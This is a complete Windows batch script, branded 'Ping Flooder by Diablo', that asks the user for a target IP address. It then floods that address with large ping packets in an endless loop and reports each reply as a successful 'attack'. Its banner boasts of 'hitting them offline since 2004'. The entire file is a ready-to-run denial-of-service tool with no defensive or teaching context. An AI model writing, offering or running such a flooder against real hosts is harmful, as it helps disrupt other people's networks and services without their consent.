@echo off

REM Change the current directory to the directory containing your script
set "SCRIPT_DIR=%~dp0"
cd /d "%SCRIPT_DIR%"

title Ping Flooder by Diablo V4.3.4 Final


REM Set the batch file to read-only
attrib +R "Ping Flooder by Diablo V4.3.4 Final"

echo Ping Flooder by Diablo V4.3.4 Final
echo Historical .BAT File Ping Flooder, Hitting them offline since 2004!

REM Prompt user to enter IP address to target
set /p ip=Enter the IP address:

REM begin
:begin

echo Launching the Attack!

REM Loop to perform ping flood attack
setlocal enabledelayedexpansion
set count=0
set maxCount=10000000

:loop
if !count! equ %maxCount% goto timeout

REM Perform ping command and check for reply
ping -n 1 -l 1472 -w 100 %ip% | findstr /c:"Reply from" >nul
if !errorlevel! equ 0 (
    echo Attack on %ip% Successful!
) else (
    echo Attempted Attack on %ip% Failed!
)

REM Increment count and display progress
set /a count+=1
echo (Count: !count!)
goto loop

:timeout
echo Attack timed out, beginning to relaunch the Attack!
timeout /t 3 >nul

REM Repeat to begin
goto begin
